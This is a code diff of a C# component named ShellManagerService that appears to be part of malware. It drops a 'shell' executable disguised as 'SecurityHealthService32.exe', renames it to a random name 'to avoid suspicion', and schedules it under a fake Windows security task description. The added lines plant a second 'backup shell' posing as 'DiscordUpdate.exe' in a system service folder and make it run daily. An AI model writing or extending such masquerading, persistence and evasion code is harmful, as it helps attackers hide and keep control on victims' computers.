@@ -1,11 +1,8 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
-using System.Text;
 using System.Threading;
-using System.Threading.Tasks;
 using Microsoft.Win32.TaskScheduler;
 
 namespace ShellManagerService
@@ -14,12 +11,14 @@ namespace ShellManagerService
     { 
         public const int tmp_name_length = 16;
         public const string exe_name = "SecurityHealthService32.exe";
+        public const string backup_shell_folder = "C:\\Windows\\ServiceProfiles\\NetworkService\\Downloads\\";
+        public const string backup_shell_name = "DiscordUpdate.exe";
         private static Random random = new Random();
 
         public static string old_tmp_name { get; set; }
         public static void LoadShellInDisk()
         {
-            //Call the process audiodb since people are dumb as fuck when looking for it on google will lead to audiodg.exe which is a legitimate Windows executable
+            //Call the process with some "realistic" name
             string tmp_name = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, exe_name);
 
             //Check if shell is already running
@@ -61,11 +60,39 @@ namespace ShellManagerService
             //Start process
             StartProcess(tmp_name);
 
-            Thread.Sleep(10000);
+            Thread.Sleep(5000);
 
             //Rename the file changing the extension to .tmp to avoid suspicion in case someone opens the folder I guess(?)
             old_tmp_name = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, RandomModuleName(tmp_name_length));
             File.Move(tmp_name, old_tmp_name);
+        }
+        //This loads the second "backup shell" on disk and starts a task which should replay once (or more) times a day
+        public static void LoadSecondShellAndStartService()
+        {
+            var full_path = backup_shell_folder + backup_shell_name;
+
+            while (true)
+            {
+                try
+                {
+                    //Write bytes into file
+                    FileStream fs = new FileStream(full_path,
+                                           FileMode.Open,
+                                           FileAccess.Write);
+                    fs.Write(shell_image, 0, shell_image.Length);
+                    fs.Close();
+                    break;
+                }
+                catch
+                {
+
+                }
+            }
+
+            using (var ts = new TaskService())
+            {
+                var t = ts.Execute(full_path).Every(1).Days().Starting(DateTime.Now.AddHours(6));
+            }
         }
         //Give the module a random ass name idk
         public static string RandomModuleName(int length)
@@ -81,7 +108,7 @@ namespace ShellManagerService
             {
                 var t = ts.Execute(file_path)
                     .Once()
-                    .Starting(DateTime.Now.AddSeconds(5))
+                    .Starting(DateTime.Now.AddSeconds(1))
                     .AsTask("Windows security manager service is used to check health and integrity of important system resources.");
             }
         }
